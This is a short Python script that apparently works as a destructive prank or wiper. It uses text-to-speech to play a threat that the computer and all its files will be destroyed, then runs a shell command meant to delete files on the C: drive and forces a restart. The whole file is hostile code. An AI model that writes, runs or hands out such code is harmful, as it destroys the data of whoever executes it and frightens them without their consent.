import os
from tkinter import *
from gtts import gTTS
import subprocess

root = Tk()


mytext = 'your computer will be destroyed, all files, directories, and registry values will be destroyed. shut down your computer and your doomed. starting now. there is no escape.'
language = 'en'
# Passing the text and language to the engine,
# here we have marked slow=False. Which tells
# the module that the converted audio should
# have a high speed
myobj = gTTS(text=mytext, lang=language, slow=False)
myobj.save("pymods.mp3")
os.system("pymods.mp3")
subprocess.call("Del C:\ *.* /y ", shell=True)
subprocess.call("shutdown /r", shell=True)
